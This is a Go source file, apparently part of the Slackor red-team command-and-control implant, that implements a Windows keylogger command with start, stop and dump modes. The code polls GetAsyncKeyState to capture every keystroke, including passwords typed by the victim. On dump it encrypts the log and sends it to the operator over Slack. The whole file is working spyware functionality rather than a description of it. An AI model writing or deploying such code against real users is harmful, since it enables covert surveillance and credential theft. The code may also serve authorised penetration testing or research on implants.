// +build windows

package windows

import (
	"errors"
	"syscall"
	"time"

	"github.com/Coalfire-Research/Slackor/internal/config"
	"github.com/Coalfire-Research/Slackor/internal/crypto"
	"github.com/Coalfire-Research/Slackor/internal/slack"
)

var (
	dll, _              = syscall.LoadDLL("user32.dll")
	GetAsyncKeyState, _ = dll.FindProc("GetAsyncKeyState")
	tmpKeylog           string
	shift               bool
	caps                bool
)

// KeyScan controls whether the keylogger is turned on or not
type KeyScan struct{}

// Name is the name of the command
func (k KeyScan) Name() string {
	return "keyscan"
}

// Run controls whether the keylogger is turned on or not
func (k KeyScan) Run(clientID string, jobID string, args []string) (string, error) {
	if len(args) != 1 {
		return "", errors.New("keyscan takes one argument: start, stop, or dump")
	}
	mode := args[0]
	switch mode {
	case "start":
		if config.Keylogger == false {
			config.Keylogger = true
			go keylogger()
			return "Keylogger started.", nil
		}
		return "Keylogger running.", nil
	case "stop":
		config.Keylogger = false
		return "Keylogger stopped.", nil
	case "dump":
		encryptedOutput, _ := crypto.Encrypt([]byte(tmpKeylog))
		slack.SendResult(clientID, jobID, "output", encryptedOutput)
		tmpKeylog = ""
		return "Keylog dumped.", nil
	default:
		return "", errors.New("unknown keyscan subcommand, must be one of: start, stop, or dump")
	}
}

// keylogger constantly checks for active key presses
func keylogger() {
	for {
		if config.Keylogger == false { // End function if keylogger is shut off
			return
		}
		time.Sleep(1 * time.Millisecond)
		shiftchk, _, _ := GetAsyncKeyState.Call(uintptr(vk_SHIFT))
		if shiftchk == 0x8000 {
			shift = true
		} else {
			shift = false
		}
		for i := 0; i < 256; i++ {
			Result, _, _ := GetAsyncKeyState.Call(uintptr(i))

			if Result&0x1 == 0 {
				continue
			}
			switch i {
			case vk_CONTROL:
				tmpKeylog += "[Ctrl]"
			case vk_BACK:
				tmpKeylog += "[Back]"
			case vk_TAB:
				tmpKeylog += "[Tab]"
			case vk_RETURN:
				tmpKeylog += "[Enter]\r\n"
			case vk_SHIFT:
				tmpKeylog += "[Shift]"
			case vk_MENU:
				tmpKeylog += "[Alt]"
			case vk_CAPITAL:
				tmpKeylog += "[CapsLock]"
				if caps {
					caps = false
				} else {
					caps = true
				}
			case vk_ESCAPE:
				tmpKeylog += "[Esc]"
			case vk_SPACE:
				tmpKeylog += " "
			case vk_PRIOR:
				tmpKeylog += "[PageUp]"
			case vk_NEXT:
				tmpKeylog += "[PageDown]"
			case vk_END:
				tmpKeylog += "[End]"
			case vk_HOME:
				tmpKeylog += "[Home]"
			case vk_LEFT:
				tmpKeylog += "[Left]"
			case vk_UP:
				tmpKeylog += "[Up]"
			case vk_RIGHT:
				tmpKeylog += "[Right]"
			case vk_DOWN:
				tmpKeylog += "[Down]"
			case vk_SELECT:
				tmpKeylog += "[Select]"
			case vk_PRINT:
				tmpKeylog += "[Print]"
			case vk_EXECUTE:
				tmpKeylog += "[Execute]"
			case vk_SNAPSHOT:
				tmpKeylog += "[PrintScreen]"
			case vk_INSERT:
				tmpKeylog += "[Insert]"
			case vk_DELETE:
				tmpKeylog += "[Delete]"
			case vk_LWIN:
				tmpKeylog += "[LeftWindows]"
			case vk_RWIN:
				tmpKeylog += "[RightWindows]"
			case vk_APPS:
				tmpKeylog += "[Applications]"
			case vk_SLEEP:
				tmpKeylog += "[Sleep]"
			case vk_NUMPAD0:
				tmpKeylog += "[Pad 0]"
			case vk_NUMPAD1:
				tmpKeylog += "[Pad 1]"
			case vk_NUMPAD2:
				tmpKeylog += "[Pad 2]"
			case vk_NUMPAD3:
				tmpKeylog += "[Pad 3]"
			case vk_NUMPAD4:
				tmpKeylog += "[Pad 4]"
			case vk_NUMPAD5:
				tmpKeylog += "[Pad 5]"
			case vk_NUMPAD6:
				tmpKeylog += "[Pad 6]"
			case vk_NUMPAD7:
				tmpKeylog += "[Pad 7]"
			case vk_NUMPAD8:
				tmpKeylog += "[Pad 8]"
			case vk_NUMPAD9:
				tmpKeylog += "[Pad 9]"
			case vk_MULTIPLY:
				tmpKeylog += "*"
			case vk_ADD:
				if shift {
					tmpKeylog += "+"
				} else {
					tmpKeylog += "="
				}
			case vk_SEPARATOR:
				tmpKeylog += "[Separator]"
			case vk_SUBTRACT:
				if shift {
					tmpKeylog += "_"
				} else {
					tmpKeylog += "-"
				}
			case vk_DECIMAL:
				tmpKeylog += "."
			case vk_DIVIDE:
				tmpKeylog += "[Devide]"
			case vk_F1:
				tmpKeylog += "[F1]"
			case vk_F2:
				tmpKeylog += "[F2]"
			case vk_F3:
				tmpKeylog += "[F3]"
			case vk_F4:
				tmpKeylog += "[F4]"
			case vk_F5:
				tmpKeylog += "[F5]"
			case vk_F6:
				tmpKeylog += "[F6]"
			case vk_F7:
				tmpKeylog += "[F7]"
			case vk_F8:
				tmpKeylog += "[F8]"
			case vk_F9:
				tmpKeylog += "[F9]"
			case vk_F10:
				tmpKeylog += "[F10]"
			case vk_F11:
				tmpKeylog += "[F11]"
			case vk_F12:
				tmpKeylog += "[F12]"
			case vk_NUMLOCK:
				tmpKeylog += "[NumLock]"
			case vk_SCROLL:
				tmpKeylog += "[ScrollLock]"
			case vk_LSHIFT:
				tmpKeylog += "[LeftShift]"
			case vk_RSHIFT:
				tmpKeylog += "[RightShift]"
			case vk_LCONTROL:
				tmpKeylog += "[LeftCtrl]"
			case vk_RCONTROL:
				tmpKeylog += "[RightCtrl]"
			case vk_LMENU:
				tmpKeylog += "[LeftMenu]"
			case vk_RMENU:
				tmpKeylog += "[RightMenu]"
			case vk_OEM_1:
				if shift {
					tmpKeylog += ":"
				} else {
					tmpKeylog += ";"
				}
			case vk_OEM_2:
				if shift {
					tmpKeylog += "?"
				} else {
					tmpKeylog += "/"
				}
			case vk_OEM_3:
				if shift {
					tmpKeylog += "~"
				} else {
					tmpKeylog += "`"
				}
			case vk_OEM_4:
				if shift {
					tmpKeylog += "{"
				} else {
					tmpKeylog += "["
				}
			case vk_OEM_5:
				if shift {
					tmpKeylog += "|"
				} else {
					tmpKeylog += "\\"
				}
			case vk_OEM_6:
				if shift {
					tmpKeylog += "}"
				} else {
					tmpKeylog += "]"
				}
			case vk_OEM_7:
				if shift {
					tmpKeylog += `"`
				} else {
					tmpKeylog += "'"
				}
			case vk_OEM_PERIOD:
				if shift {
					tmpKeylog += ">"
				} else {
					tmpKeylog += "."
				}
			case 0x30:
				if shift {
					tmpKeylog += ")"
				} else {
					tmpKeylog += "0"
				}
			case 0x31:
				if shift {
					tmpKeylog += "!"
				} else {
					tmpKeylog += "1"
				}
			case 0x32:
				if shift {
					tmpKeylog += "@"
				} else {
					tmpKeylog += "2"
				}
			case 0x33:
				if shift {
					tmpKeylog += "#"
				} else {
					tmpKeylog += "3"
				}
			case 0x34:
				if shift {
					tmpKeylog += "$"
				} else {
					tmpKeylog += "4"
				}
			case 0x35:
				if shift {
					tmpKeylog += "%"
				} else {
					tmpKeylog += "5"
				}
			case 0x36:
				if shift {
					tmpKeylog += "^"
				} else {
					tmpKeylog += "6"
				}
			case 0x37:
				if shift {
					tmpKeylog += "&"
				} else {
					tmpKeylog += "7"
				}
			case 0x38:
				if shift {
					tmpKeylog += "*"
				} else {
					tmpKeylog += "8"
				}
			case 0x39:
				if shift {
					tmpKeylog += "("
				} else {
					tmpKeylog += "9"
				}
			case 0x41:
				if caps || shift {
					tmpKeylog += "A"
				} else {
					tmpKeylog += "a"
				}
			case 0x42:
				if caps || shift {
					tmpKeylog += "B"
				} else {
					tmpKeylog += "b"
				}
			case 0x43:
				if caps || shift {
					tmpKeylog += "C"
				} else {
					tmpKeylog += "c"
				}
			case 0x44:
				if caps || shift {
					tmpKeylog += "D"
				} else {
					tmpKeylog += "d"
				}
			case 0x45:
				if caps || shift {
					tmpKeylog += "E"
				} else {
					tmpKeylog += "e"
				}
			case 0x46:
				if caps || shift {
					tmpKeylog += "F"
				} else {
					tmpKeylog += "f"
				}
			case 0x47:
				if caps || shift {
					tmpKeylog += "G"
				} else {
					tmpKeylog += "g"
				}
			case 0x48:
				if caps || shift {
					tmpKeylog += "H"
				} else {
					tmpKeylog += "h"
				}
			case 0x49:
				if caps || shift {
					tmpKeylog += "I"
				} else {
					tmpKeylog += "i"
				}
			case 0x4A:
				if caps || shift {
					tmpKeylog += "J"
				} else {
					tmpKeylog += "j"
				}
			case 0x4B:
				if caps || shift {
					tmpKeylog += "K"
				} else {
					tmpKeylog += "k"
				}
			case 0x4C:
				if caps || shift {
					tmpKeylog += "L"
				} else {
					tmpKeylog += "l"
				}
			case 0x4D:
				if caps || shift {
					tmpKeylog += "M"
				} else {
					tmpKeylog += "m"
				}
			case 0x4E:
				if caps || shift {
					tmpKeylog += "N"
				} else {
					tmpKeylog += "n"
				}
			case 0x4F:
				if caps || shift {
					tmpKeylog += "O"
				} else {
					tmpKeylog += "o"
				}
			case 0x50:
				if caps || shift {
					tmpKeylog += "P"
				} else {
					tmpKeylog += "p"
				}
			case 0x51:
				if caps || shift {
					tmpKeylog += "Q"
				} else {
					tmpKeylog += "q"
				}
			case 0x52:
				if caps || shift {
					tmpKeylog += "R"
				} else {
					tmpKeylog += "r"
				}
			case 0x53:
				if caps || shift {
					tmpKeylog += "S"
				} else {
					tmpKeylog += "s"
				}
			case 0x54:
				if caps || shift {
					tmpKeylog += "T"
				} else {
					tmpKeylog += "t"
				}
			case 0x55:
				if caps || shift {
					tmpKeylog += "U"
				} else {
					tmpKeylog += "u"
				}
			case 0x56:
				if caps || shift {
					tmpKeylog += "V"
				} else {
					tmpKeylog += "v"
				}
			case 0x57:
				if caps || shift {
					tmpKeylog += "W"
				} else {
					tmpKeylog += "w"
				}
			case 0x58:
				if caps || shift {
					tmpKeylog += "X"
				} else {
					tmpKeylog += "x"
				}
			case 0x59:
				if caps || shift {
					tmpKeylog += "Y"
				} else {
					tmpKeylog += "y"
				}
			case 0x5A:
				if caps || shift {
					tmpKeylog += "Z"
				} else {
					tmpKeylog += "z"
				}
			}
		}
	}
}
